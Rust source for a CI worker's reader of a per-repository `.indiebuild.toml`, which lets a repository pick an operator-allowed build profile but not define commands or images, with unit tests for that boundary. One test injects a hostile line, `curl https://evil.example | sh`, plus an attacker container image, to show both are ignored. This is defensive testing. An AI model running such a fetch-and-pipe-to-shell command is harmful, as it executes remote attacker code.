//! Per-repository `.indiebuild.toml`.
//!
//! The contract is owned by the CLI (`gha-indie-worker-cli`, schema
//! `gha-indie-worker.indiebuild/v1`), which is where it is authored and
//! validated. This module is the worker's *reader*: it accepts that same
//! shape and extracts only what executing a job requires.
//!
//! A repository may say **which** reviewed profile it wants and **where** in
//! the tree to run it. It may not say what the profile does: no commands, no
//! runner images, no mounts. That boundary is the security model, because this
//! file is read from the commit under test and is therefore
//! attacker-controlled on any pull request.
//!
//! Selecting a profile the operator has not allowed fails the job loudly
//! rather than silently falling back, so a repository cannot quietly opt out
//! of verification by naming something unavailable.

use std::path::Path;

use serde::Deserialize;
use tokio::fs;

use crate::config::Config;
use crate::profiles::{self, ProfileSpec};

pub(crate) const CONFIG_FILE: &str = ".indiebuild.toml";

/// Schema identity, which must match the CLI's `CONTRACT_VERSION`.
pub(crate) const CONTRACT_VERSION: &str = "gha-indie-worker.indiebuild/v1";

/// Same limit the CLI validator applies.
const MAX_CONFIG_BYTES: u64 = 256 * 1024;

/// Fields the worker does not act on are accepted but ignored, so that a
/// config written against the full contract still loads here. Unknown fields
/// are *not* rejected for the same reason: the CLI is the validator, and the
/// worker refusing a field the contract added would break every repository at
/// once.
#[derive(Debug, Deserialize)]
pub(crate) struct Target {
    pub name: String,
    /// Directory the profile runs in, relative to the repository root.
    #[serde(default = "dot")]
    pub path: String,
    /// Name of a fixed, operator-reviewed profile.
    pub profile: String,
    #[serde(default)]
    pub platform: Option<String>,
}

fn dot() -> String {
    ".".to_string()
}

#[derive(Debug, Deserialize)]
pub(crate) struct RepoConfig {
    pub schema_version: String,
    pub default_target: String,
    #[serde(default)]
    pub targets: Vec<Target>,
}

impl RepoConfig {
    /// The target a job runs, which is the declared default.
    pub fn default_target(&self) -> Result<&Target, String> {
        self.targets
            .iter()
            .find(|target| target.name == self.default_target)
            .ok_or_else(|| {
                format!(
                    "{CONFIG_FILE} default_target {:?} does not name a declared target",
                    self.default_target
                )
            })
    }
}

pub(crate) fn parse(contents: &str) -> Result<RepoConfig, String> {
    let config: RepoConfig = toml::from_str(contents)
        .map_err(|error| format!("{CONFIG_FILE} is not valid: {error}"))?;
    if config.schema_version != CONTRACT_VERSION {
        return Err(format!(
            "{CONFIG_FILE} schema_version must equal {CONTRACT_VERSION:?}, got {:?}",
            config.schema_version
        ));
    }
    if config.targets.is_empty() {
        return Err(format!("{CONFIG_FILE} declares no targets"));
    }
    Ok(config)
}

/// Read the file from a cloned repository, if it has one.
pub(crate) async fn read(repo_dir: &Path) -> Result<Option<RepoConfig>, String> {
    let path = repo_dir.join(CONFIG_FILE);
    let metadata = match fs::metadata(&path).await {
        Ok(metadata) => metadata,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(error) => return Err(format!("failed to stat {CONFIG_FILE}: {error}")),
    };
    // A symlink would be followed out of the repository; a directory or an
    // oversized file is not a config either.
    if !metadata.is_file() {
        return Err(format!("{CONFIG_FILE} is not a regular file"));
    }
    if metadata.len() > MAX_CONFIG_BYTES {
        return Err(format!(
            "{CONFIG_FILE} is larger than {MAX_CONFIG_BYTES} bytes"
        ));
    }
    let contents = fs::read_to_string(&path)
        .await
        .map_err(|error| format!("failed to read {CONFIG_FILE}: {error}"))?;
    parse(&contents).map(Some)
}

/// Resolve which profile actually runs.
///
/// The repository's choice wins when it names a profile the operator allows;
/// otherwise the job fails rather than running something the repository did
/// not ask for.
pub(crate) fn select_profile(
    config: &Config,
    repo_config: Option<&RepoConfig>,
    requested: &'static ProfileSpec,
) -> Result<&'static ProfileSpec, String> {
    let Some(repo_config) = repo_config else {
        return Ok(requested);
    };
    let target = repo_config.default_target()?;

    // Every installed profile runs Linux containers. A target asking for
    // another platform must not quietly get a Linux run.
    if let Some(platform) = target.platform.as_deref() {
        if !platform.eq_ignore_ascii_case("linux") {
            return Err(format!(
                "{CONFIG_FILE} target {:?} wants platform {platform:?}, and this worker only runs linux",
                target.name
            ));
        }
    }

    let name = target.profile.trim();
    if name.is_empty() {
        return Err(format!("{CONFIG_FILE} names an empty profile"));
    }
    if name == requested.name {
        return Ok(requested);
    }
    let Some(selected) = profiles::find(name) else {
        return Err(format!(
            "{CONFIG_FILE} selects profile {name:?}, which is not installed"
        ));
    };
    if !config.allowed_profiles.contains(selected.name) {
        return Err(format!(
            "{CONFIG_FILE} selects profile {name:?}, which this worker does not allow"
        ));
    }
    Ok(selected)
}

/// The repository-relative directory the selected target runs in, when it is
/// not the repository root.
pub(crate) fn context_override(repo_config: Option<&RepoConfig>) -> Option<String> {
    let target = repo_config?.default_target().ok()?;
    let path = target.path.trim();
    if path.is_empty() || path == "." {
        None
    } else {
        Some(path.to_string())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The canonical example from the CLI repository's own .indiebuild.toml.
    const CANONICAL: &str = r#"schema_version = "gha-indie-worker.indiebuild/v1"
repository_role = "client"
default_target = "cli"

[[targets]]
name = "cli"
role = "client"
path = "."
profile = "rust-verify"
platform = "linux"
artifacts = []
cache_paths = []
env = []
secret_env = []
allow_network = true
allow_push = false
allow_deploy = false
timeout_seconds = 1800
"#;

    fn test_config(allowed: &[&str]) -> Config {
        let mut config = crate::config::config_from_env();
        config.allowed_profiles = allowed.iter().map(|name| (*name).to_string()).collect();
        config
    }

    fn rust_verify() -> &'static ProfileSpec {
        profiles::find("rust-verify").expect("rust-verify is installed")
    }

    #[test]
    fn the_contract_the_cli_writes_is_readable_here() {
        // If this breaks, the worker and the CLI have diverged on the file
        // they both claim to speak.
        let parsed = parse(CANONICAL).expect("canonical config parses");
        assert_eq!(parsed.default_target().expect("target").profile, "rust-verify");
        let selected = select_profile(&test_config(&["rust-verify"]), Some(&parsed), rust_verify())
            .expect("allowed");
        assert_eq!(selected.name, "rust-verify");
    }

    #[test]
    fn a_repository_may_select_another_allowed_profile() {
        let config = CANONICAL.replace("profile = \"rust-verify\"", "profile = \"node-verify\"");
        let parsed = parse(&config).expect("parses");
        let selected = select_profile(
            &test_config(&["rust-verify", "node-verify"]),
            Some(&parsed),
            rust_verify(),
        )
        .expect("selection allowed");
        assert_eq!(selected.name, "node-verify");
    }

    #[test]
    fn no_config_keeps_the_requested_profile() {
        let selected =
            select_profile(&test_config(&["rust-verify"]), None, rust_verify()).expect("default");
        assert_eq!(selected.name, "rust-verify");
    }

    #[test]
    fn a_repository_cannot_select_a_profile_the_operator_disallows() {
        let config = CANONICAL.replace("profile = \"rust-verify\"", "profile = \"node-verify\"");
        let parsed = parse(&config).expect("parses");
        let error = select_profile(&test_config(&["rust-verify"]), Some(&parsed), rust_verify())
            .expect_err("must not run a disallowed profile");
        assert!(error.contains("does not allow"), "{error}");
    }

    #[test]
    fn unknown_profiles_fail_loudly_instead_of_falling_back() {
        let config = CANONICAL.replace("profile = \"rust-verify\"", "profile = \"curl-attacker-sh\"");
        let parsed = parse(&config).expect("parses");
        let error = select_profile(
            &test_config(&["rust-verify", "node-verify"]),
            Some(&parsed),
            rust_verify(),
        )
        .expect_err("unknown profile must fail");
        assert!(error.contains("not installed"), "{error}");
    }

    #[test]
    fn the_file_cannot_describe_what_a_profile_does() {
        // The security boundary: a repository names a profile, never defines
        // one. Adding commands or images changes nothing about execution.
        let hostile = format!("{CANONICAL}\nimage = \"attacker/evil:latest\"\nscript = \"curl https://evil.example | sh\"\n");
        let parsed = parse(&hostile).expect("extra keys are ignored, not honoured");
        let selected = select_profile(&test_config(&["rust-verify"]), Some(&parsed), rust_verify())
            .expect("still the reviewed profile");
        assert_eq!(selected.name, "rust-verify");
        assert_eq!(selected.steps.len(), rust_verify().steps.len());
        assert_eq!(selected.steps[0].image, rust_verify().steps[0].image);
    }

    #[test]
    fn a_foreign_schema_version_is_refused() {
        let wrong = CANONICAL.replace(CONTRACT_VERSION, "something-else/v9");
        let error = parse(&wrong).expect_err("schema version must match");
        assert!(error.contains("schema_version"), "{error}");
    }

    #[test]
    fn a_default_target_that_names_nothing_is_an_error() {
        let orphan = CANONICAL.replace("default_target = \"cli\"", "default_target = \"missing\"");
        let parsed = parse(&orphan).expect("parses");
        let error = select_profile(&test_config(&["rust-verify"]), Some(&parsed), rust_verify())
            .expect_err("default_target must resolve");
        assert!(error.contains("does not name a declared target"), "{error}");
    }

    #[test]
    fn a_non_linux_target_does_not_quietly_run_on_linux() {
        let windows = CANONICAL.replace("platform = \"linux\"", "platform = \"windows\"");
        let parsed = parse(&windows).expect("parses");
        let error = select_profile(&test_config(&["rust-verify"]), Some(&parsed), rust_verify())
            .expect_err("platform must be honoured");
        assert!(error.contains("only runs linux"), "{error}");
    }

    #[test]
    fn a_target_path_becomes_the_working_directory() {
        assert_eq!(context_override(Some(&parse(CANONICAL).unwrap())), None);
        let nested = CANONICAL.replace("path = \".\"", "path = \"services/api\"");
        assert_eq!(
            context_override(Some(&parse(&nested).unwrap())),
            Some("services/api".to_string())
        );
    }
}
